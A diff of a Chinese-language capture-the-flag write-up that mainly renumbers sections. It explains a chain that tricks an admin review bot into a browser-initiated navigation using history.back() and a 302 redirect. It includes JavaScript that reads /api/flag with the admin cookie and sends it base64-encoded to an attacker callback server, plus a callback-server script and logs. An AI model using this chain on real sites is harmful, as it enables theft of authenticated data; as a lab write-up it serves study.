 `Sec-Fetch-*` 系列请求头由浏览器自动附加（Fetch Metadata 机制），标明"这个请求是怎么发起的"。页面脚本无法伪造或修改这些头。`Sec-Fetch-Site` 的取值与含义：
 
@@ -867,9 +876,9 @@ window.open("http://localhost:3000/review?rid=" + rid);
 
 对照检查 4 的要求（`Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document`）：请求必须是一次"由浏览器发起的顶层文档导航"。脚本能做出的所有跳转都不满足；**历史回退可以**。
 
-> 补充：回退/前进产生的重新请求是否真的发出，与页面的缓存条件有关。本题的入口页响应带 `Cache-Control: no-store`（2.5），本地复现中回退触发了真实的第二次网络请求（第四章日志）。如果换成会被浏览器缓存直接复用的页面，可能不会产生这次请求。
+> 补充：回退/前进产生的重新请求是否真的发出，与页面的缓存条件有关。本题的入口页响应带 `Cache-Control: no-store`（2.4），本地复现中回退触发了真实的第二次网络请求（第四章日志）。如果换成会被浏览器缓存直接复用的页面，可能不会产生这次请求。
 
-#### 2.8.2 攻击序列：让主窗口回退进审查页
+#### 2.9.2 攻击序列：让主窗口回退进审查页
 
 三个页面配合完成（角色：机器人主窗口停在入口页；弹窗停在 `helper`）：
 
@@ -896,7 +905,7 @@ window.open("http://localhost:3000/review?rid=" + rid);
 
 - **`about:blank` 步骤的作用**：主窗口需要先"离开"入口网址，`history.back()` 才有可回退的记录（历史栈变成"入口网址 ← about:blank"，回退即回到入口）。`about:blank` 是一次不产生网络请求的导航，不会干扰机器人的导航监听（见下条）；
 - **为什么 `helper` 能操作主窗口**：`helper` 与入口页都由攻击者控制、同源；同源窗口之间可以互相访问 `history` 对象。`opener` 是弹窗对"打开它的窗口"（主窗口）的引用；
-- **为什么这次导航恰好设置 `finalized`**：机器人 `watchDocument` 的规则（2.3.3）是"主窗口的导航请求命中审查页 → `finalized = approved && !diverged`"。整个序列里主窗口的导航请求只有三次：入口网址（第一步，记为入口）、回退后再次访问入口网址（与入口相同，不算偏离）、以及 302 之后的审查页请求（命中）。`about:blank` 不产生网络请求，不会被计入。因此 `diverged` 保持为假，命中时 `approved` 已为真（2.7 完成），`finalized` 被置真。
+- **为什么这次导航恰好设置 `finalized`**：机器人 `watchDocument` 的规则（2.6.3）是"主窗口的导航请求命中审查页 → `finalized = approved && !diverged`"。整个序列里主窗口的导航请求只有三次：入口网址（第一步，记为入口）、回退后再次访问入口网址（与入口相同，不算偏离）、以及 302 之后的审查页请求（命中）。`about:blank` 不产生网络请求，不会被计入。因此 `diverged` 保持为假，命中时 `approved` 已为真（2.8 完成），`finalized` 被置真。
 
 入口页第二次访问的处理（回调服务器端，完整脚本见第五章）：
 
@@ -909,22 +918,14 @@ if visits[p.query] > 1:                       # 第二次访问
     return
 ```
 
-入口页自身的第一段脚本（主窗口侧，与 2.7 的入口页是同一段）：
+入口页脚本里负责回退的部分（前两段见 2.7、2.8；完整脚本见第五章）：
 
 ```javascript
-const q = new URLSearchParams(location.search);
-const i = q.get("rid");
-const w = open("http://localhost:3000/review?rid=" + i);     // 弹窗：审批页面（2.7）
-// 沙箱转交的端口到达时执行：回报 ready 以触发批准（2.7），随后进入回退序列（2.8.2）
-onmessage = e => {
-  const port = e.ports[0];
-  if (!port) return;
-  port.postMessage("ready");                                  // 批准（2.7）
-  setTimeout(() => {
-    w.location = "/helper";                                   // 弹窗转去 helper
-    setTimeout(() => location = "about:blank", 250);          // 主窗口离开入口网址（写入历史记录）
-  }, 500);
-};
+// 发送 ready 之后执行：转入回退序列
+setTimeout(() => {
+  w.location = "/helper";                                     // 弹窗转去 helper
+  setTimeout(() => location = "about:blank", 250);            // 主窗口离开入口网址（写入历史记录）
+}, 500);
 ```
 
 `/helper` 的内容：
@@ -933,22 +934,22 @@ onmessage = e => {
 <script>setTimeout(() => opener.history.back(), 500)</script>
 ```
 
-#### 2.8.3 至此八项检查的状态
+#### 2.9.3 至此八项检查的状态
 
 | # | 检查项 | 状态 | 由哪一步完成 |
 |---|---|---|---|
 | 1 | 管理员会话 | ✓ | 顶层导航（回退 + 302）自动携带 cookie |
 | 2 | rid 匹配 | ✓ | 机器人追加，回调服务器原样放进 302 目标 |
-| 3 | 笔记存在 | ✓ | 攻击者创建并通过检查（2.6） |
+| 3 | 笔记存在 | ✓ | 攻击者创建并通过检查（2.3） |
 | 4 | `policy`（none + document） | ✓ | 回退产生的浏览器发起导航，经 302 保持 |
 | 5 | `prepared` | ✓ | 机器人步骤 4 |
-| 6 | `approved` | ✓ | 审批页面调用 `/complete`（2.7） |
+| 6 | `approved` | ✓ | 审批页面调用 `/complete`（2.8） |
 | 7 | `finalized` | ✓ | 主窗口导航命中审查页时由 `watchDocument` 置位 |
 | 8 | `!used` | ✓ | 首次消费 |
 
 审查页随即输出笔记原文（无 CSP 响应头）。剩下最后一件事：把 flag 送出来。
 
-### 2.9 问题四：把 flag 送到回调服务器
+### 2.10 攻击第 4 段：读取 flag 并外传
 
 > 一句话说明：审查页输出的笔记原文会在挑战域（`http://localhost:3000`）顶层被浏览器渲染，`s.js` 因此再执行一次，这次它不再等待端口，而是直接以同源身份请求 `/api/flag`（管理员 cookie 随请求自动携带），把响应内容发送到回调服务器。
 
@@ -965,7 +966,7 @@ if (location.pathname == "/reports/check") {
     .then(r => r.text())
     .then(t => location = C + "/flag?x=" + btoa(t));  // 把响应内容 base64 后发往回调服务器
 } else {
-  // 分支二：在沙箱（/sandbox）里执行时走这里，转交消息端口（2.7）
+  // 分支二：在沙箱（/sandbox）里执行时走这里，转交消息端口（2.8）
   onmessage = e => { if (e.ports[0]) parent.opener.postMessage(0, "*", e.ports); };
 }
 ```
@@ -974,20 +975,20 @@ if (location.pathname == "/reports/check") {
 
 | 执行位置 | `location.pathname` | 走的分支 |
 |---|---|---|
-| 审批页面的沙箱 iframe 内（笔记被 `/sandbox` 渲染） | `/sandbox` | 转交端口（2.7） |
+| 审批页面的沙箱 iframe 内（笔记被 `/sandbox` 渲染） | `/sandbox` | 转交端口（2.8） |
 | 审查页顶层（笔记原文被原样输出后渲染） | `/reports/check` | 读取 flag 并外传 |
 
 分支一能成功读取 `/api/flag` 的原因：审查页的第二次访问是一次顶层导航，机器人浏览器的管理员 cookie 在当前页面（`localhost:3000`）上有效；`/api/flag` 与当前页面同源，`fetch` 自动携带该 cookie。
 
 外传使用 `btoa(...)` 把响应内容（JSON 文本）编码进 URL 查询参数。这里绕开的是"让数据离开浏览器"的最后一环：浏览器允许页面把当前窗口导航到任意地址，查询参数即数据通道。回调服务器收到 `/flag?x=...` 后做一次 base64 解码，取出其中的 flag 值（实现见第五章路由 4）。
 
-### 2.10 攻击链完整时序
+### 2.11 攻击链完整时序
 
-把 2.5-2.9 的全部动作按时间顺序合在一起（S 表示服务端状态变化，括号内是第四章的日志行）：
+把 2.3 到 2.10 里攻击者与机器人的全部动作按时间顺序合在一起（S 表示服务端状态变化，括号内是第四章的日志行）：
 
 | 序 | 发起方 | 动作 | 状态/日志 |
 |---|---|---|---|
-| 1 | 攻击者 | `POST /create` 提交 2.6.5 的笔记 | 检查通过，得到笔记编号 |
+| 1 | 攻击者 | `POST /create` 提交 2.3.5 的笔记 | 检查通过，得到笔记编号 |
 | 2 | 攻击者 | `POST /report`，网址为回调服务器的入口页地址（带 `note` 参数） | 机器人启动本轮审查 |
 | 3 | 机器人 | 步骤 1：访问 `/reports/session` | 管理员会话建立 |
 | 4 | 机器人 | 步骤 2：访问审查页（第一次） | `visited = true`（日志①） |
@@ -1015,7 +1016,7 @@ if (location.pathname == "/reports/check") {
 | `/create` | POST | 创建笔记（过检查器） | 无 |
 | `/report` | POST | 提交网址触发机器人审查 | 限速 3 次/分钟 |
 | `/reports/session` | GET | 建立管理员会话 | 请求头 `X-Bot-Token` |
-| `/reports/check` | GET | 审查页：第一次标记；第二次输出笔记原文 | 管理员会话 + 检查清单（2.4） |
+| `/reports/check` | GET | 审查页：第一次标记；第二次输出笔记原文 | 管理员会话 + 检查清单（2.6.2） |
 | `/complete` | POST | 置 `approved = true` | 管理员会话 + `id` + `state` + `prepared` |
 | `/review` | GET | 审批页面 | rid 匹配（**不检查管理员**） |
 | `/sandbox` | GET | 在 iframe 中渲染笔记 | 管理员会话 + `prepared` |
@@ -1050,7 +1051,7 @@ if (location.pathname == "/reports/check") {
 | 环节 | 判据 |
 |---|---|
 | 检查器通过 | `POST /create` 返回 302，Location 为 `/note/<编号>` |
-| 脚本在沙箱执行 | 回调服务器收到 `/s.js` 请求（以及 2.6.6 验证时的 `/hit`） |
+| 脚本在沙箱执行 | 回调服务器收到 `/s.js` 请求（以及 2.3.6 验证时的 `/hit`） |
 | 批准成功 | 服务端日志出现 `/REAL /complete admin=true ... match=true` |
 | 第二次访问全过 | 服务端日志出现 `/CHECK ... sf=none/document ap=true fin=true prep=true` |
 | 拿到 flag | 回调服务器打印 `FLAG = pwnsec{...}` |
@@ -1079,14 +1080,14 @@ if (location.pathname == "/reports/check") {
 
 | 行 | 含义 | 对应章节 |
 |---|---|---|
-| `[*] callback server on :8000` | 回调服务器启动（四个端点就绪） | 2.5 |
-| `[*] /create → 302 Location=/note/f378f2...` | 笔记创建成功并通过检查器，编号为 `f378f2bce2ecc059c395` | 2.2、2.6 |
-| `[CB] entry visit #1 rid=f15f3f2e7f` | 机器人第一次访问入口页（rid 由机器人追加） | 2.3、2.10 序 7 |
-| `[CB] helper hit → opener.history.back()` | 弹窗被导航到 `/helper` 并触发主窗口历史回退 | 2.8 |
-| `[CB] entry visit #2 rid=f15f3f2e7f` | 回退产生真实的第二次请求（`Sec-Fetch-Site: none` 在此请求上） | 2.8 |
-| `[CB] → 302 to /reports/check ...` | 第二次访问返回 302，把导航送往审查页 | 2.8 |
+| `[*] callback server on :8000` | 回调服务器启动（四个端点就绪） | 2.4 |
+| `[*] /create → 302 Location=/note/f378f2...` | 笔记创建成功并通过检查器，编号为 `f378f2bce2ecc059c395` | 2.2、2.3 |
+| `[CB] entry visit #1 rid=f15f3f2e7f` | 机器人第一次访问入口页（rid 由机器人追加） | 2.6、2.11 序 7 |
+| `[CB] helper hit → opener.history.back()` | 弹窗被导航到 `/helper` 并触发主窗口历史回退 | 2.9 |
+| `[CB] entry visit #2 rid=f15f3f2e7f` | 回退产生真实的第二次请求（`Sec-Fetch-Site: none` 在此请求上） | 2.9 |
+| `[CB] → 302 to /reports/check ...` | 第二次访问返回 302，把导航送往审查页 | 2.9 |
 | `[*] /report → 200` | `/report` 接口返回；此时整条链已执行完毕 | 无 |
-| `[FLAG] = pwnsec{real_flag_on_remote}` | 回调服务器收到外传的 flag 并解码（本地占位值） | 2.9 |
+| `[FLAG] = pwnsec{real_flag_on_remote}` | 回调服务器收到外传的 flag 并解码（本地占位值） | 2.10 |
 
 ### 4.2 服务端日志（容器内 `/tmp/proof.txt`）
 
@@ -1102,13 +1103,13 @@ if (location.pathname == "/reports/check") {
 
 | 行 | 含义 | 对应章节 |
 |---|---|---|
-| 第 1 行 `/CHECK ... visited=false ...` | 机器人访问审查页**第一次**：`visited` 尚为假；本次请求由 goto 发出，`sf=none/document` | 2.3.2 步骤 2 |
-| 第 2 行 `/review ... match=true admin=true` | 审批页面被打开（弹窗顶层导航携带管理员 cookie） | 2.7.3 |
-| 第 3 行 `/sandbox ... prepared=true` | 沙箱 iframe 加载笔记原文，`s.js` 在此执行 | 2.6.6 |
-| 第 4 行 `/REAL /complete ... match=true` | 审批页面调用 `/complete` 成功（`admin`、`id`、`state`、`prepared` 全对） | 2.7 |
-| 第 5 行 `/CHECK ... visited=true sf=none/document ap=true fin=true prep=true used=false` | 第二次访问：八项检查全过（`used=false` 是处理开始时的取值，通过后随即置真） | 2.8.3 |
+| 第 1 行 `/CHECK ... visited=false ...` | 机器人访问审查页**第一次**：`visited` 尚为假；本次请求由 goto 发出，`sf=none/document` | 2.6.1 步骤 2 |
+| 第 2 行 `/review ... match=true admin=true` | 审批页面被打开（弹窗顶层导航携带管理员 cookie） | 2.7.1 |
+| 第 3 行 `/sandbox ... prepared=true` | 沙箱 iframe 加载笔记原文，`s.js` 在此执行 | 2.3.6 |
+| 第 4 行 `/REAL /complete ... match=true` | 审批页面调用 `/complete` 成功（`admin`、`id`、`state`、`prepared` 全对） | 2.8 |
+| 第 5 行 `/CHECK ... visited=true sf=none/document ap=true fin=true prep=true used=false` | 第二次访问：八项检查全过（`used=false` 是处理开始时的取值，通过后随即置真） | 2.9.3 |
 
-第 5 行是整条链的收束点：`sf=none/document` 证明该请求由浏览器发起；`ap=true fin=true prep=true` 证明三项攻击者制造的检查全部完成。该请求之后，审查页输出笔记原文，笔记中的脚本在顶层再次执行并把 flag 发往回调服务器。
+第 5 行是整条链的收束点：`sf=none/document` 证明该请求由浏览器发起；`ap=true fin=true prep=true` 证明 `approved`、`finalized`、`prepared` 三项均已就位。该请求之后，审查页输出笔记原文，笔记中的脚本在顶层再次执行并把 flag 发往回调服务器。
 
 ### 4.3 观察提示
 
@@ -1187,7 +1188,7 @@ class Handler(BaseHTTPRequestHandler):
         self.send_header("Content-Type",
             "application/javascript" if parsed.path == "/s.js" else "text/html")
         self.send_header("Content-Length", str(len(body)))
-        self.send_header("Cache-Control", "no-store")   # 入口页必须 no-store（2.8.1）
+        self.send_header("Cache-Control", "no-store")   # 入口页必须 no-store（2.9.1）
         self.end_headers()
         self.wfile.write(body)
 
@@ -1226,13 +1227,13 @@ server.shutdown()
 
 | 脚本部分 | 作用 | 对应章节 |
 |---|---|---|
-| 路由 `/`（根路径） | 入口页：开弹窗、收端口发 `ready`、转入回退序列；第二次访问给 302 | 2.7、2.8 |
-| 路由 `/helper` | 对主窗口执行 `history.back()` | 2.8.2 |
-| 路由 `/s.js` | 注入笔记的脚本（双分支） | 2.6、2.7、2.9 |
-| 路由 `/flag` | 接收 base64 编码的 flag | 2.9 |
-| `payload` 变量 | 2.6.5 组装的笔记 HTML | 2.6 |
+| 路由 `/`（根路径） | 入口页：开弹窗、收端口发 `ready`、转入回退序列；第二次访问给 302 | 2.7、2.8、2.9 |
+| 路由 `/helper` | 对主窗口执行 `history.back()` | 2.9.2 |
+| 路由 `/s.js` | 注入笔记的脚本（双分支） | 2.3、2.8、2.10 |
+| 路由 `/flag` | 接收 base64 编码的 flag | 2.10 |
+| `payload` 变量 | 2.3.5 组装的笔记 HTML | 2.3 |
 | `/create` 调用 | 创建笔记并取回编号 | 2.2 |
-| `/report` 调用 | 提交入口页地址，触发机器人 | 2.3 |
+| `/report` 调用 | 提交入口页地址，触发机器人 | 2.5 |
 
 > 与官方原版脚本的两处差异（复现适配）：目标地址从 `instance.json` 的 `main` 端点改为本地映射 `http://127.0.0.1:3001`；回调地址从 `instance.json` 的 `callback` 端点改为 `http://host.docker.internal:8000`。逻辑与官方版本一致。
 
@@ -1269,13 +1270,13 @@ python3 solve.py
 | 服务端五个状态位 | 在 `/reports/check` 处理函数开头加 `appendFileSync("/tmp/proof.txt", ...)`（格式见 4.2），然后 `docker compose exec challenge cat /tmp/proof.txt` |
 | 机器人是否访问了入口页 | 回调服务器日志的 `entry visit #1` |
 | 回退是否产生真实请求 | 回调服务器日志出现 `entry visit #2`（没有出现说明入口响应缺少 `no-store` 或回退序列未执行） |
-| 脚本是否在沙箱执行 | 2.6.6 的 `/hit` 验证法 |
+| 脚本是否在沙箱执行 | 2.3.6 的 `/hit` 验证法 |
 
 ### 6.4 常见问题
 
 | 症状 | 原因 | 修法 |
 |---|---|---|
-| `/create` 返回 400 `Document profile rejected` | payload 与 2.6.5 不完全一致（常见：单引号、无引号属性、`</template>` 数量被改动） | 逐字节对照 2.6.5 的 payload |
+| `/create` 返回 400 `Document profile rejected` | payload 与 2.3.5 不完全一致（常见：单引号、无引号属性、`</template>` 数量被改动） | 逐字节对照 2.3.5 的 payload |
 | 笔记创建成功但整条链无反应 | 容器内 Chromium 过旧，不支持 DPU / 声明式 Shadow DOM | 使用题目原版镜像（Chromium 152 实测可用） |
 | `/report` 返回 429 | 限速：同一分钟提交超过 3 次 | 等一分钟再试 |
 | 只看到 `entry visit #1`，没有 `#2` | 弹窗被拦截或 helper 未执行 | 确认环境为无头模式（本题目机器人就是无头）；检查 `/helper` 路由是否可达 |
@@ -1326,7 +1327,7 @@ python3 solve.py
 
 当时的判断：19200 例模糊测试全部失败，且逐项排查了 `noscript`、编码、截断、双 meta 等方向后，判定"检查器不可绕过"，并停止了该方向的搜索。
 
-赛后对照（2.6 的 payload）：绕过依赖三个机制：`noscript` 双模式（一直存在）、声明式 Shadow DOM（2021/2023 年特性，MDN 有公开文档）、DPU（2026 年 5 月公告、Chrome 150 起支持的新特性）。其中声明式 Shadow DOM 的知识是已有的，只是没有被"检查器在数什么"这一提问激活；DPU 属于 2026 年新进入 Chrome 支持的特性。
+赛后对照（2.3 的 payload）：绕过依赖三个机制：`noscript` 双模式（一直存在）、声明式 Shadow DOM（2021/2023 年特性，MDN 有公开文档）、DPU（2026 年 5 月公告、Chrome 150 起支持的新特性）。其中声明式 Shadow DOM 的知识是已有的，只是没有被"检查器在数什么"这一提问激活；DPU 属于 2026 年新进入 Chrome 支持的特性。
 
 当时可执行而未做的动作：做一次机制向检索，例如"两个环境读取同一份输入，可能有哪些解析差异"、"Chromium 近一年新增了哪些解析行为"。这两个提问的第一个结果页就包含 MDN 的模板元素文档与 Chrome 官方博客的 DPU 公告。
 
@@ -1354,7 +1355,7 @@ python3 solve.py
 
 配合两处信息泄漏（机器人把 `rid` 追加到提交的网址上，入口请求的 URL 里可见；`/review` 只校验 `rid` 不校验管理员，可以直接读出 `state`），攻击者就能用自己的服务器伪造一次 `/complete` 调用（带上窃取到的 `sid`），并让随后的 302 链通过全部检查。该链在本地连续 3 次成功。
 
-适用范围：在远程环境里，回调服务器位于容器之外（跨站），cookie 不会发送（实测：入口请求的 Cookie 头为空）。因此该链只在"回调服务器与目标同站"时成立，不能用于真实远程环境。官方解法（2.6-2.9）不需要窃取会话：批准由审批页面完成、`none` 由历史回退产生，全部组件在远程条件下均成立。
+适用范围：在远程环境里，回调服务器位于容器之外（跨站），cookie 不会发送（实测：入口请求的 Cookie 头为空）。因此该链只在"回调服务器与目标同站"时成立，不能用于真实远程环境。官方解法（2.7-2.10）不需要窃取会话：批准由审批页面完成、`none` 由历史回退产生，全部组件在远程条件下均成立。
 
 ### 8.4 失败原因的逐层定位
 
@@ -1401,9 +1402,9 @@ python3 solve.py
 
 | 文件 | 内容 | 相关章节 |
 |---|---|---|
-| `src/server.js` | 全部路由、会话配置、审查状态机 | 2.2-2.4 |
-| `bot/bot.js` | 检查器 `inspectDocument`；机器人 `review`、`watchDocument` | 2.2、2.3 |
-| `src/views/review.ejs` | 审批页面（iframe + MessageChannel 批准逻辑） | 2.7 |
+| `src/server.js` | 全部路由、会话配置、审查状态机 | 2.2、2.5、2.6.2 |
+| `bot/bot.js` | 检查器 `inspectDocument`；机器人 `review`、`watchDocument` | 2.2、2.6 |
+| `src/views/review.ejs` | 审批页面（iframe + MessageChannel 批准逻辑） | 2.7.2、2.8 |
 | `docker-compose.yml` | 环境变量与端口映射 | 2.1 |
 
 ### 附 B：术语速查
